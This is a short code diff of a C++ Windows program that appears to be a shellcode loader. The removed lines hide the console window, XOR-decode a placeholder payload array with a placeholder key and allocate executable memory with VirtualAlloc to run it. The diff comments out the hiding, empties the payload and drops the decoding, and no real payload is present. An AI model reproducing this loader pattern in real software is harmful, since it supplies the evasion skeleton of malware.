@@ -5,15 +5,18 @@ using namespace std;
 
 int main(int argc, char **argv)
 {
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    // ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-    unsigned char b[] = {__CODE_HERE__};
+    unsigned char b[] = {};
     int x;
     unsigned char c[sizeof b];
 
+    cout << "Input: ";
+    cin >> x;
+
     for (int i = 0; i < sizeof b; i++)
     {
-        c[i] = b[i] ^ '__KEY_HERE__';
+        c[i] = b[i];
     }
 
     void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
